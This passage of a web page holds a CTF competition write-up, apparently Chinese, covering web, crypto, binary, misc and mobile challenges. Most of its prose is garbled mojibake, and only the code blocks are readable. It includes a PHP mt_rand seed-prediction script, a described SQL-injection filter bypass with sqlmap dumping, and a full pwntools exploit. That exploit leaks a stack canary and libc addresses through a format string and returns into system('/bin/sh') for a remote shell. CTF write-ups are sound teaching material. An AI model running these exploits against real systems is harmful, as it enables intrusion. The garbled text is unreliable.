Wrong</h1><p>æ‰¾åˆ°è¿™ä¸ª <code>.index.php.swp</code> é€šè¿‡æ¢å¤æ–‡ä»¶ <code>vim -r index.php</code> å¾—åˆ°ä¸‹é¢æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_password</span>(<span class="params">$pw_length =  <span class="number">10</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">$randpwd = <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $pw_length; $i++)  </span><br><span class="line">&#123;  </span><br><span class="line">$randpwd .= chr(mt_rand(<span class="number">33</span>, <span class="number">126</span>));  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">return</span> $randpwd;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">mt_srand(time());</span><br><span class="line">$pwd=create_password();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($pwd==$_GET[<span class="string">&#x27;pwd&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>($_SESSION[<span class="string">&#x27;userLogin&#x27;</span>]==$_GET[<span class="string">&#x27;login&#x27;</span>])</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Good job, you get the key&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="string">&quot;Wrong!&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&#x27;userLogin&#x27;</span>]=create_password(<span class="number">32</span>).rand();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡å°å°çš„å®¡è®¡å¾—åˆ°æ€è·¯ æŠŠcookieåˆ æ‰<br>å°±å¯ä»¥è¿‡ç¬¬äºŒä¸ªif($_SESSION[â€˜userLoginâ€™]==$_GET[â€˜loginâ€™])</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">function create_password($pw_length &#x3D;  10) </span><br><span class="line">&#123;  </span><br><span class="line">    $randpwd &#x3D; &quot;&quot;; </span><br><span class="line">    for ($i &#x3D; 0; $i &lt; $pw_length; $i++)  </span><br><span class="line">    &#123;  </span><br><span class="line">        $randpwd .&#x3D; chr(mt_rand(33, 126));  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $randpwd;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">mt_srand(1492307701);</span><br><span class="line">$pwd&#x3D;create_password();</span><br><span class="line">var_dump($pwd);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¸‹é¢è„šæœ¬å¾—åˆ°ä¸€ä¸ªéšåçš„æ—¶é—´æˆ³ï¼Œç”¨ <code>burp</code> ä¸æ–­å‘åŒ…ï¼Œç­‰åˆ°æ—¶é—´åˆ°äº†è®¾ç½®çš„æ—¶é—´æˆ³å°±ä¼šå¾—åˆ° <code>flag</code></p><p>##web4 so easy:<br>è®¿é—®:<code>http://117.34.111.15:89/</code> å¾—åˆ°éƒ¨åˆ†æºç </p><p><a href="http://i.imgur.com/2MLmzn8.png" class="gallery-item"><img src="http://i.imgur.com/2MLmzn8.png"></a></p><ol><li><p>wafæ‹¦æˆªäº†<code>é€—å·ã€ç©ºæ ¼ã€andã€union</code>ç­‰å…³é”®å­—ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤<code>midã€asciiã€fromç­‰å…³é”®å­—</code>ï¼Œå› ä¸ºè¿‡æ»¤äº†andï¼Œé‚£å°±åˆ©ç”¨Mysqlçš„ä½è¿ç®—<code>0&#39;^1^&#39;1</code>ç»“æœä¸º0ï¼Œæ‹¼æ¥sqlè¯­å¥ä¸º<code>select role from  user where username =&#39;0&#39;^1^0</code>æˆåŠŸå¾—åˆ°æŸ¥è¯¢åˆ°adminçš„role</p></li><li><p>åˆ©ç”¨boolå‹ç›²æ³¨è¿›è¡Œæ³¨å…¥ï¼Œç”¨()ä»£æ›¿ç©ºæ ¼ï¼Œç”¨from 1 ä»£æ›¿,å†™ä¸€ä¸ªè„šæœ¬è·‘ä¸€ä¸‹ï¼Œå¾—åˆ°å¯†ç : <code>37b1d2f04f594bfffc826fd69e389688</code></p><p> <a href="http://i.imgur.com/CWEovXF.png" class="gallery-item"><img src="http://i.imgur.com/CWEovXF.png"></a></p></li><li><p>åˆ©ç”¨æ³¨å…¥çš„å¯†ç å»ç™»å½•</p><p> <a href="http://i.imgur.com/g6oxtms.png" class="gallery-item"><img src="http://i.imgur.com/g6oxtms.png"></a></p></li><li><p>è¿™é‡Œç›´æ¥ç”¨mysqlå­—ç¬¦é—®é¢˜è§£å†³ï¼ŒæˆåŠŸè·å–flag</p><p> <a href="http://i.imgur.com/5R2rXH0.png" class="gallery-item"><img src="http://i.imgur.com/5R2rXH0.png"></a></p></li></ol><p>##web5 just a testï¼š<br>1.éšæ‰‹å‘ç°æ³¨å…¥<br>ç›´æ¥sqlmapè·‘ï¼Œå¼€å§‹ä¸€ç›´åœ¨è·‘test1åº“ï¼Œè·‘åˆ°åå°ç®¡ç†è´¦å·å¯†ç ï¼Œåå°æ²¡æœ‰</p><p>2.åˆ—äº†ä¸€ä¸‹æ•°æ®åº“ï¼Œçœ‹åˆ°äº†teståº“ï¼Œæƒ³åˆ°é¢˜ç›®æ‰çŸ¥é“å…¥å‘äº†ï¼Œä½†æ˜¯è·‘ä¸å‡ºæ¥åˆ—å¾—åˆ°åˆ—åä¸ºfl@gï¼Œå°è¯•å»è·‘å†…å®¹ï¼Œä½†æ˜¯æ®µéƒ½åˆ—ä¸äº†ï¼Œç”¨å°è¯•æ‰‹å·¥ï¼ŒæˆåŠŸè·å–åˆ°fl@gçš„åˆ—ä¸ºf1ag(ps:å‘å°±åœ¨@ï¼Œmysqlä¼šæŠŠgå½“åšå˜é‡ï¼Œæ²¡åŠæ³•æŸ¥è¯¢ï¼Œç”¨åå¼•å·æ‰©èµ·æ¥å°±å¥½äº†)</p><p><a href="http://i.imgur.com/ClmCCbs.png" class="gallery-item"><img src="http://i.imgur.com/ClmCCbs.png"></a></p><p><a href="http://i.imgur.com/Xkcyt7V.png" class="gallery-item"><img src="http://i.imgur.com/Xkcyt7V.png"></a></p><p>å› ä¸ºextractvalueæœ‰32ä½çš„é™åˆ¶ï¼Œç›´æ¥æŠŠf1agåŠ åœ¨sqlmapçš„åˆ—çš„ç›®å½•é‡Œé¢ï¼Œç›´æ¥dumpå§</p><p><a href="http://i.imgur.com/pkyjJZN.png" class="gallery-item"><img src="http://i.imgur.com/pkyjJZN.png"></a></p><h1 id="Crypto1-ç­¾åˆ°"><a href="#Crypto1-ç­¾åˆ°" class="headerlink" title="Crypto1 ç­¾åˆ°"></a>Crypto1 ç­¾åˆ°</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ~ <span class="built_in">echo</span> <span class="string">&quot;ZmxhZ3tXZWlTdW9GeXVfQmllTGFuZ30=&quot;</span> | base64 -D</span><br><span class="line">flag&#123;WeiSuoFyu_BieLang&#125;                                 </span><br></pre></td></tr></table></figure><h1 id="Crypt2-200"><a href="#Crypt2-200" class="headerlink" title="Crypt2 200"></a>Crypt2 200</h1><p>å°å¼ºä¸å°å¿ƒæˆªè·äº†ä¸¤ä¸ªè€å¤–åŒæœåŠ¡å™¨çš„åŠ å¯†é€šä¿¡æ•°æ®ï¼Œçœ‹çœ‹ä»–ä»¬åœ¨è¯´äº›ä»€ä¹ˆã€‚ã€‚ã€‚</p><p>åœ¨é€šä¿¡æµé‡ä¸­èƒ½æ‰¾åˆ° N å’ŒEï¼ŒçŒœæµ‹å¯†æ–‡éƒ½æ˜¯ä¸€æ ·çš„ï¼Œç”¨å…±æ¨¡æ”»å‡»<br>å¾—åˆ° <code>flag&#123;flag&#123;Hc0mm0nModulusR$AH&#125;&#125;</code></p><h1 id="Bin1-Now"><a href="#Bin1-Now" class="headerlink" title="Bin1 Now"></a>Bin1 Now</h1><p>ç¨‹åºä½¿ç”¨è‡ªä¿®æ”¹ä»£ç ã€ç¬¬ä¸‰æ–¹æ ‡å‡†åº“ç­‰æ‰‹æ®µï¼Œå½±å“é™æ€åˆ†æã€‚ç¨‹åºè¾“å…¥åœ¨<code>00402047</code>å¤„ï¼Œæ¥ç€åœ¨<code>004020E9</code>æ£€æŸ¥é•¿åº¦æ˜¯å¦ä¸º9ã€‚é€šè¿‡<code>004038F0</code>è¾“å‡ºè°ƒç”¨å®šä½åˆ°å…³é”®è¾“å‡ºåœ¨<code>00402490</code>å‡½æ•°ä¸­ï¼Œæ­¤æ§åˆ¶æ­¤å‡½æ•°å…³é”®ä¹‹è·³çš„<code>dword_446184</code>æ˜¯åœ¨<code>402640</code>å‡½æ•°ä¸­ç¡®å®šçš„ã€‚ç»†çœ‹ä¸‹æ­¤å‡½æ•°ï¼Œå‘ç°å…³é”®ç®—æ³•ä¹Ÿåœ¨æ­¤å¤„ï¼Œå°†è¾“å…¥å’Œ<code>xmmword_43AC00</code>åˆ†åˆ«è¿ç®—åè¿›è¡Œæ¯”è¾ƒï¼Œå› ä¸º<code>xmmword_43AC00</code>çš„è®¡ç®—ç»“æœä¸ºå®šå€¼ï¼Œæ•´ç†ä¸‹å³å¯åç®—å‡ºè¾“å…¥<code>536724689</code>ï¼Œä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">check = [<span class="number">0x0b</span>,<span class="number">0x06</span>,<span class="number">0x15</span>,<span class="number">0x0b</span>,<span class="number">0x04</span>,<span class="number">0x0e</span>,<span class="number">0x16</span>,<span class="number">0x10</span>,<span class="number">0x31</span>]</span><br><span class="line">input = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">s2 = check[<span class="number">3</span>*i+<span class="number">1</span>]/<span class="number">2</span></span><br><span class="line">s1 = check[<span class="number">3</span>*i]<span class="number">-2</span>*s2</span><br><span class="line">s3 = check[<span class="number">3</span>*i+<span class="number">2</span>]<span class="number">-5</span>*s2</span><br><span class="line">input += chr(s1+<span class="number">0x30</span>)+chr(s2+<span class="number">0x30</span>)+chr(s3+<span class="number">0x30</span>)</span><br><span class="line"><span class="keyword">print</span> input</span><br></pre></td></tr></table></figure><p>å°†è¾“å…¥ä»£å…¥ç¨‹åºå³å¯å¾—åˆ°åé¢ä¸€éƒ¨åˆ†çš„flagï¼š<code>0IdWan9&#125;</code><br>æ ¹æ®é¢˜ç›®æç¤ºï¼Œç»ˆäºåœ¨æ–‡ä»¶çš„è¯¦ç»†èµ„æ–™é‡Œæ‰¾åˆ°ä¸€ä¸²base64ä¸²ï¼Œè§£ä¹‹å¾—åˆ°<code>flag&#123;aoot@mail:</code>ã€‚<br>æ‰€ä»¥æœ€ç»ˆflag:<code>flag&#123;aoot@mail:0IdWan9&#125;</code>ã€‚</p><h1 id="Bin2-Magical-Box"><a href="#Bin2-Magical-Box" class="headerlink" title="Bin2 Magical Box"></a>Bin2 Magical Box</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;117.34.80.134&quot;</span>, <span class="number">7777</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;you?\n&quot;</span>)</span><br><span class="line">    payload = <span class="string">&quot;aa&quot;</span> + p32(addr) + <span class="string">&quot;%5$s&quot;</span></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;login!aa&quot;</span>)</span><br><span class="line">    r.recv(<span class="number">4</span>)</span><br><span class="line">    data = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    data = data.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_canary</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;you?\n&quot;</span>)</span><br><span class="line">    payload = <span class="string">&quot;%7$p&quot;</span></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;login!&quot;</span>)</span><br><span class="line">    data = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    data = data.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">canary = int(leak_canary(),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*] canary:&#123;0&#125;&quot;</span>.format(hex(canary))</span><br><span class="line"></span><br><span class="line">printf_got = <span class="number">0x0804B010</span></span><br><span class="line">leak_data = leak(printf_got)</span><br><span class="line">printf_addr = u32(leak_data[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">fflush_addr = u32(leak_data[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*] printf:&#123;0&#125;&quot;</span>.format(hex(printf_addr))</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*] fflush:&#123;0&#125;&quot;</span>.format(hex(fflush_addr))</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">sh_addr = next(libc.search(<span class="string">&quot;/bin/sh&quot;</span>)) + libc_base</span><br><span class="line"><span class="comment">#attach()</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;you?\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;admin2017&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;commands.&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;add&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;APP/Site: &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x31</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Username: &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;b&quot;</span>*<span class="number">0x1d</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Password: &quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">30</span></span><br><span class="line">payload += p32(canary)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0xc</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += p32(sh_addr)</span><br><span class="line">payload += p32(sh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="Misc1-ä¸€ç»´ç "><a href="#Misc1-ä¸€ç»´ç " class="headerlink" title="Misc1 ä¸€ç»´ç "></a>Misc1 ä¸€ç»´ç </h1><p>é¦–å…ˆï¼Œä»å›¾ç‰‡ä¸­è¿›è¡Œ <code>LSB</code> æå–ï¼Œèƒ½è·å–ä¸€ä¸ª <code>ELF</code> æ–‡ä»¶ã€‚</p><p><a href="http://oayoilchh.bkt.clouddn.com/17-4-16/76519164-file_1492348397533_13ebf.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-4-16/76519164-file_1492348397533_13ebf.png"></a></p><p>åˆå› ä¸ºä¹‹å‰æ‰«ç å¾—çŸ¥ä¸€ä¸ªé’ˆå¯¹å¯æ‰§è¡Œæ–‡ä»¶çš„éšå†™å·¥å…·hydanï¼Œé€šè¿‡è¿™ä¸ªå°±èƒ½å¾—åˆ°flagäº†ã€‚</p><h1 id="Misc3ä¹¾å¤"><a href="#Misc3ä¹¾å¤" class="headerlink" title="Misc3ä¹¾å¤"></a>Misc3ä¹¾å¤</h1><p>åœ¨æ•°æ®åŒ…å¯¼å‡ºhttpå¯¹è±¡ï¼Œé‡Œé¢æœ‰2ä¸ªzipåŒ…ï¼ˆåœ¨linuxä¸‹å¯ä»¥çœ‹å¾—æ¸…æ¥šï¼‰ï¼Œè§£å‹åä¸€ä¸ªæ˜¯flag.exeå¦ä¸€ä¸ªæ˜¯encode.pyï¼Œencode.pyæ˜¯æŠŠflagè¿›è¡Œå¤šæ¬¡b64æ›¿æ¢å¹¶åšå¤„ç†ï¼Œè€Œflag.exeåœ¨æœ€åé¢é™„å¸¦äº†å¯†æ–‡ï¼Œç¼–å†™decode.pyå³å¯</p><p><code>flag&#123;n1_hEn_baNg_0&#125;</code></p><h1 id="Misc4-è½¨è¿¹"><a href="#Misc4-è½¨è¿¹" class="headerlink" title="Misc4 è½¨è¿¹"></a>Misc4 è½¨è¿¹</h1><p>USBæµé‡æ•è·ä¸è§£æï¼Œä¹‹å‰åœ¨360å®‰å…¨å®¢çœ‹åˆ°è¿‡ç±»ä¼¼çš„é¢˜ç›®ï¼Œæˆ‘è®°å¾—å¥½åƒè¿˜æ˜¯XNUCA Miscä¸“åœºçš„é¢˜ã€‚çŒœæµ‹åˆæ˜¯ç”»flagäº†ï¼Œç¥­å‡ºæˆ‘çš„ç¥å™¨ï¼ï¼ˆå½“ç„¶ä¹Ÿä¸æ˜¯æˆ‘çš„æ˜¯githubä¸Šçš„å¤§ç¥å†™çš„ï¼‰<a href="https://github.com/gloxec/UsbMiceDataHacker">https://github.com/gloxec/UsbMiceDataHacker</a></p><p><a href="http://oayoilchh.bkt.clouddn.com/17-4-16/26696594-file_1492349034373_3a9b.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-4-16/26696594-file_1492349034373_3a9b.png"></a></p><p>ç»è¿‡ä¸€ç•ªè‰°éš¾çš„è¯†åˆ«ã€‚ã€‚ã€‚ã€‚</p><h1 id="Misc5-ç§æ£µæ ‘å§"><a href="#Misc5-ç§æ£µæ ‘å§" class="headerlink" title="Misc5 ç§æ£µæ ‘å§"></a>Misc5 ç§æ£µæ ‘å§</h1><p>å¯¹ç¬¬ä¸€ä¸ªå›¾ç‰‡æ–Œwalk å¾—åˆ°ä¸€ä¸ªgifï¼ŒåŠ ä¸Šå¤´ï¼Œèƒ½å¾—åˆ° In-order <code> &#123;RY!heHVaL-goAI&#123;dxj_GpnUw8&#125;kzu*Er:s56fFl2i&#125;</code><br>strings ç¬¬äºŒä¸ªå›¾ç‰‡å¾—åˆ°  Post-order<code>&#123;YR!eVa-gLAoxd_j&#123;pw&#125;8zkUnGuIHh:r65f2lFsEi*&#125;</code><br>äºŒå‰æ ‘å°±äºŒå‰æ ‘å— â€¦çœŸæ˜¯çš„<br>ç”±ä¸­åºå’Œååºç”»å‡ºäºŒå‰æ ‘ï¼Œç„¶åæŒ‰å±‚æ¬¡éå† å¾—åˆ°hi!HEReIsYouFLAG:flag{n52V-jPU6d_kx8zw}</p><h1 id="Misc6-æˆ‘ä»¬çš„ç§˜å¯†"><a href="#Misc6-æˆ‘ä»¬çš„ç§˜å¯†" class="headerlink" title="Misc6 æˆ‘ä»¬çš„ç§˜å¯†"></a>Misc6 æˆ‘ä»¬çš„ç§˜å¯†</h1><p>å¯¹æ–‡ä»¶è¿›è¡Œ<code>binwak secret.zip -e</code>å¾—åˆ°ä¸€ä¸ªreame.txtæ–‡ä»¶ï¼Œä½¿ç”¨æ˜æ–‡æ”»å‡»ï¼Œå¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼š3xatu2o17<br>è§£å‹åä¸»è¦æœ‰ä¸¤æ–‡ä»¶ï¼Œä¸€ä¸ªéŸ³é¢‘ï¼Œä¸€ä¸ªè§†é¢‘ï¼ŒéŸ³é¢‘ä¸­è§£æ‘©å°”æ–¯å¾—åˆ°CTFSECWAR2017ï¼Œç„¶åçŒœæµ‹é¢˜ç›®çš„æ„æ€ï¼Œour secretè¿™æ˜¯ä¸€æ¬¾éšå†™è½¯ä»¶ï¼Œé€šè¿‡ä»–å’Œä¹‹å‰å¾—åˆ°çš„å­—ç¬¦ä¸²å¾—åˆ°<code>flag&#123;v1de0_c0nc3a1_lala&#125;</code></p><p><a href="http://oayoilchh.bkt.clouddn.com/17-4-16/34757794-file_1492350154404_4c6b.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-4-16/34757794-file_1492350154404_4c6b.png"></a></p><h1 id="MOBILE1-æ‹¯æ•‘é²ç­ä¸ƒå·"><a href="#MOBILE1-æ‹¯æ•‘é²ç­ä¸ƒå·" class="headerlink" title="MOBILE1 æ‹¯æ•‘é²ç­ä¸ƒå·"></a>MOBILE1 æ‹¯æ•‘é²ç­ä¸ƒå·</h1><p>é¢˜ç›®å¯¹è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œç®€å•çš„å˜æ¢ï¼Œæ¯ä¸ªå¾ªç¯ä¸­ï¼Œé¦–å…ˆå°†å½“å‰indexæŒ‡å‘çš„ç›¸é‚»ä¸¤ä¸ªå­—ç¬¦äº’æ¢ï¼Œç„¶åå°†è¿›å…¥ä¸€ä¸ªå°å¾ªç¯ä¾æ¬¡æ¯éš”3ä¸ªäº’æ¢ã€‚åŠ è§£å¯†æ—¶éœ€æ³¨æ„äº’æ¢çš„è¾¹ç•Œã€‚å¯†æ–‡ä¸ºâ€œ!S#@A4DF32511@43â€ï¼Œæ˜æ–‡ä¸ºâ€œ!@#@ASDF3451123â€ã€‚<br>åŠ è§£å¯†ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;!@#@ASDF34511234&#x27;</span></span><br><span class="line"><span class="keyword">print</span> len(s)</span><br><span class="line">l = list(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(l) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">    l[i], l[i - <span class="number">1</span>] = l[i - <span class="number">1</span>], l[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>, len(l), <span class="number">4</span>):</span><br><span class="line">        l[j - <span class="number">4</span>], l[j] = l[j], l[j - <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> l</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join(l)</span><br><span class="line"></span><br><span class="line"><span class="comment"># s = &#x27;S!@#@1FD23154A34&#x27;</span></span><br><span class="line"><span class="comment"># l = list(s)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(((len(l) &amp; (~<span class="number">1</span>)) - <span class="number">3</span>), <span class="number">0</span>, <span class="number">-2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range((len(l) - <span class="number">1</span>) &amp; (~<span class="number">3</span>), <span class="number">3</span>, <span class="number">-4</span>):</span><br><span class="line">        l[j - <span class="number">4</span>], l[j] = l[j], l[j - <span class="number">4</span>]</span><br><span class="line">    l[i], l[i - <span class="number">1</span>] = l[i - <span class="number">1</span>], l[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> l</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join(l)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join(l) == s</span><br></pre></td></tr></table></figure><h1 id="MOBILE-2-äººæ°‘çš„åä¹‰-æŠ“æ•èµµå¾·æ±‰1"><a href="#MOBILE-2-äººæ°‘çš„åä¹‰-æŠ“æ•èµµå¾·æ±‰1" class="headerlink" title="MOBILE 2 äººæ°‘çš„åä¹‰-æŠ“æ•èµµå¾·æ±‰1"></a>MOBILE 2 äººæ°‘çš„åä¹‰-æŠ“æ•èµµå¾·æ±‰1</h1><p>é¦–å…ˆä»sqliteæ•°æ®åº“é‡Œå–ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œidä¸º2ï¼Œè¡¨ä¸ºusersï¼Œå–å‡ºæ¥å­—ç¬¦ä¸²ä¸º9838e888496bfda98afdbb98a9b9a9d9cdfa29ï¼Œç„¶åä¼šå°†è¾“å…¥åšä¸€äº›å˜æ¢ä¸å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œå˜æ¢çš„è§„åˆ™ä¸ºæ¯ä¸ªå­—ç¬¦çš„ä½å››ä½å–åå¹¶è½¬ä¸ºåå…­è¿›åˆ¶ï¼Œç„¶ååŠ ä¸Šé«˜å››ä½ä¸0xeå¼‚æˆ–ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;9838e888496bfda98afdbb98a9b9a9d9cdfa29&#x27;</span></span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>):</span><br><span class="line">    l.append(chr(</span><br><span class="line">        (~int(s[i], <span class="number">16</span>) &amp; <span class="number">0xf</span>) + ((int(s[i + <span class="number">1</span>], <span class="number">16</span>) ^ <span class="number">0xe</span>) &lt;&lt; <span class="number">4</span>)</span><br><span class="line">    ))</span><br><span class="line"><span class="keyword">print</span> l</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join(l)</span><br></pre></td></tr></table></figure><h1 id="MOBILE-3-äººæ°‘çš„åä¹‰-æŠ“æ•èµµå¾·æ±‰2"><a href="#MOBILE-3-äººæ°‘çš„åä¹‰-æŠ“æ•èµµå¾·æ±‰2" class="headerlink" title="MOBILE 3 äººæ°‘çš„åä¹‰-æŠ“æ•èµµå¾·æ±‰2"></a>MOBILE 3 